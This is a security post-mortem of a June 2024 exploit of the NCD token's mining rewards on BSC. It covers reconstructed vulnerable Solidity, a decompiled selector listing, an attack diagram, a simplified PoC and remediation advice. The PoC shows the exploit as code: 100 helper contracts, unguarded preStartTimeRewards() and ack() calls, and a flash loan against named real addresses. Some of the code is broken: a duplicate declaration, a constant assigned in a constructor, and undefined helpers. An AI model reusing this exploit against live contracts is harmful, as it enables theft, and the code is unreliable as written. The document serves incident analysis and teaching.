# NCD — preStartTimeRewards() + ack() Reward Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | NCD |
| **Chain** | BSC |
| **Loss** | ~$6,400 |
| **NCD Token** | [0x9601313572eCd84B6B42DBC3e47bc54f8177558E](https://bscscan.com/address/0x9601313572eCd84B6B42DBC3e47bc54f8177558E) |
| **NCD/USDC Pair** | [0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF](https://bscscan.com/address/0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | `preStartTimeRewards()` allows unauthorized reward accumulation before the start time, and `ack()` allows arbitrary withdrawal of accumulated rewards — exploited via 100 contracts for mass extraction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/NCD_exp.sol) |

---

## 1. Vulnerability Overview

The NCD token mining reward system contains two vulnerable functions. The `preStartTimeRewards()` function allows rewards to be pre-accumulated before the mining start time with no authorization check. The `ack()` function withdraws accumulated rewards with no caller restriction, allowing anyone to execute it. The attacker deployed 100 `LetTheContractHaveRewards` instances, called `preStartTimeRewards()` on each to accumulate rewards, then used `ack()` to mass-withdraw NCD tokens, stealing approximately $6.4K.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: preStartTimeRewards has no access control + ack allows unlimited withdrawal
contract NCDMining {
    mapping(address => uint256) public pendingRewards;
    uint256 public mineStartTime;
    bool public hasStarted;

    // Pre-start reward accumulation — no access control
    function preStartTimeRewards() external {
        require(!hasStarted, "already started");
        // No msg.sender authorization check
        // Accumulates rewards for the caller
        pendingRewards[msg.sender] += calculatePreReward(msg.sender);
    }

    // Accumulated reward withdrawal — no caller restriction
    function ack() external {
        uint256 reward = pendingRewards[msg.sender];
        require(reward > 0, "no rewards");
        pendingRewards[msg.sender] = 0;
        NCD.transfer(msg.sender, reward);
    }

    // Mining start time query
    function mineStartTime() external view returns (uint256) {
        return _mineStartTime;
    }
}

// ✅ Secure code
function preStartTimeRewards() external onlyOwner {
    // Only admin can distribute pre-start rewards
}

function ack() external {
    // Only whitelisted addresses may call
    require(isWhitelisted[msg.sender], "not whitelisted");
    uint256 reward = pendingRewards[msg.sender];
    require(reward > 0, "no rewards");
    pendingRewards[msg.sender] = 0;
    NCD.transfer(msg.sender, reward);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: NCD_decompiled.sol
contract NCD {
contract NCD {
    address public owner;


    // Selector: 0x7e279efe
    // 📌 Burn — price manipulation risk
    function burnStartTime() external {}  // ❌ Vulnerability

    // Selector: 0xbed99850
    // 📌 Burn — price manipulation risk
    function burnRate() external {}

    // Selector: 0xe874830d
    function unknown_e874830d() external {}

    // Selector: 0xe88dc5b7
    function rewardPeriod() external {}

    // Selector: 0xe98031e0
    function unknown_e98031e0() external {}

    // Selector: 0xee4a4a65
    function walletDead() external {}

    // Selector: 0xf2bda9ce
    function setWalletInsurance(address p0) external {}

    // Selector: 0xf2fde38b
    // Alt: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)
    function transferOwnership(address p0) external {}

    // Selector: 0xc0a5d98b
    function setTaxDead(uint256 p0) external {}

    // Selector: 0xcb961a22
    function setCannotbuy(bool p0) external {}

    // Selector: 0xd0c5c585
    // 📌 Burn — price manipulation risk
    function getBurnAmount() external view returns (uint256) {}

    // Selector: 0xd3e2bb00
    function wallet20() external {}

    // Selector: 0xdd62ed3e
    function allowance(address p0, address p1) external view returns (uint256) {}

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {}

    // Selector: 0xa457c2d7
    function decreaseAllowance(address p0, uint256 p1) external {}

    // Selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // Selector: 0xb44b4b80
    function lastSellTime(address p0) external {}

    // Selector: 0xb488d70a
    function walletMarket() external {}

    // Selector: 0xb5bb2351
    // 📌 Burn — price manipulation risk
    function setBurnPeriod(uint256 p0) external {}

    // Selector: 0x7e996639
    function taxMarket() external {}

    // Selector: 0x8828b092
    function setTaxMarket(uint256 p0) external {}

    // Selector: 0x893d20e8
    function getOwner() external view returns (address) {}

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // Selector: 0x3ae4dbd0
    function unknown_3ae4dbd0() external {}

    // Selector: 0x513e6019
    function walletInsurance() external {}

    // Selector: 0x5f88ffed
    function wallet10() external {}

    // Selector: 0x6571fba3
    function setWalletMarket(address p0) external {}

    // Selector: 0x7091c458
    function wallet15() external {}

    // Selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // Selector: 0x715018a6
    function renounceOwnership() external {}

    // Selector: 0x3b0a8ed7
    // 📌 Burn — price manipulation risk
    function burnPeriod() external {}

    // Selector: 0x3ea83af8
    function unknown_3ea83af8() external {}

    // Selector: 0x41ab7d0f
    function wallet5() external {}

    // Selector: 0x49bd5a5e
    // 📌 Swap — price manipulation risk
    function uniswapV2Pair() external {}

    // Selector: 0x4e48c198
    function contractUSDT() external {}

    // Selector: 0x23b872dd
    // 📌 Arbitrary transferFrom — approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // Selector: 0x253eb941

    function mineStartTime(address p0) external {}

    // Selector: 0x2819a630

    // 📌 Missing access control on reward configuration
    function setRewardPeriod(uint256 p0) external {}

    // Selector: 0x298795a2
    function unknown_298795a2() external {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {}

    // Selector: 0x39509351
    function increaseAllowance(address p0, uint256 p1) external {}

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {}

    // Selector: 0x095ea7b3
    // 📌 approve — safeApprove race condition risk
    function approve(address p0, uint256 p1) external {}

    // Selector: 0x17391afa
    function setSellmaxrate(uint256 p0) external {}

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Swap USDC → NCD (small amount)
  │
  ├─→ [2] Deploy 100 LetTheContractHaveRewards contracts
  │         └─ Each instance can independently accumulate rewards
  │
  ├─→ [3] Call preStartTimeRewards() on each instance
  │         └─ No authorization check → pendingRewards[instance] accumulates
  │
  ├─→ [4] Flash loan 10,000 USDC
  │         └─ To acquire additional NCD
  │
  ├─→ [5] Call ack() on each instance
  │         └─ No caller restriction → mass NCD withdrawal
  │
  ├─→ [6] LetTheContractHaveUsdc.withdraw()
  │         └─ Exchange NCD → USDC
  │
  ├─→ [7] Repay flash loan (10,030 USDC)
  │
  └─→ [8] ~$6.4K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface INCDMining {
    function preStartTimeRewards() external;
    function ack() external;
    function mineStartTime() external view returns (uint256);
}

contract LetTheContractHaveRewards {
    INCDMining constant mining;

    constructor(address _mining) {
        mining = INCDMining(_mining);
    }

    // Trigger reward accumulation
    function accumulate() external {
        mining.preStartTimeRewards(); // No access control → passes
    }

    // Withdraw rewards
    function claim() external returns (uint256) {
        mining.ack(); // No caller restriction → passes
        return NCD.balanceOf(address(this));
    }
}

contract AttackContract {
    INCDMining constant ncdMining = INCDMining(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
    IERC20 constant NCD = IERC20(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
    IERC20 constant USDC = IERC20(0x55d398326f99059fF775485246999027B3197955);

    LetTheContractHaveRewards[100] instances;

    function testExploit() external {
        // [1] Swap small amount of USDC → NCD
        swapUSDCToNCD(100e18);

        // [2] Deploy 100 instances + call preStartTimeRewards
        for (uint i = 0; i < 100; i++) {
            instances[i] = new LetTheContractHaveRewards(address(ncdMining));
            instances[i].accumulate(); // Accumulate rewards
        }

        // [3] Flash loan 10,000 USDC
        flashLoan(10_000e18);

        // [4] Swap additional NCD
        swapUSDCToNCD(10_000e18);

        // [5] Call ack() on each instance → withdraw NCD
        for (uint i = 0; i < 100; i++) {
            instances[i].claim();
        }

        // [6] Exchange NCD → USDC + repay flash loan
        // ~$6.4K profit
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing access control on reward accumulation (preStartTimeRewards + ack) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (100 contracts + preStartTimeRewards + ack) |
| **DApp Category** | Token mining/reward protocol |
| **Impact** | Mass accumulation of pre-launch rewards → NCD theft (~$6.4K) |

## 6. Remediation Recommendations

1. **preStartTimeRewards access control**: Restrict with `onlyOwner` or a whitelist
2. **ack caller validation**: Allow only registered miners to withdraw rewards
3. **Reward cap**: Limit maximum accumulated rewards per single address
4. **Contract address exclusion**: Introduce `require(!isContract(msg.sender))` or a registration mechanism

## 7. Lessons Learned

- Reward distribution functions that operate before mining starts are especially critical to access-control — attackers can freely manipulate pre-launch state if left unguarded.
- The pattern of deploying multiple contract instances to bypass per-address limits must be prevented via contract address exclusion or whitelisting.
- Functions that transfer assets — such as `ack()` — must always verify that the caller is a legitimate recipient.